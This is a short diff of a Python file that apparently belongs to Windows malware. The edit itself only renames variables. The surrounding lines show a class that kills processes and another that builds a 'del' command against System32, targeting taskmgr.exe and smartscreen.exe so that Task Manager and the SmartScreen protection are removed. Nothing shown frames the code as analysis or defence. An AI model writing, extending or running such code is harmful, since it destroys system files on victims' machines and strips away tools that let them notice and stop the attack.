@@ -3,8 +3,8 @@
 import os, sys
 
 # ENVIRONMENT VARIABLE
-d = os.environ["SystemDrive"]
-usr = os.environ["USERNAME"]
+letter_drive_path = os.environ["SystemDrive"]
+current_user      = os.environ["USERNAME"]
 
 class Kill():
     """ Class that allows to kill processes """
@@ -32,7 +32,7 @@ class Remove():
     """ Class that allows to delete processes """
     def __init__(self):
         self.ex = "del"
-        self.r1 = "{}\\Windows\\System32\\".format(d)
+        self.r1 = "{}\\Windows\\System32\\".format(letter_drive_path)
     # Function to delete process in the directory specified
     def stsk(self):
         procs = ['taskmgr.exe', 'smartscreen.exe']
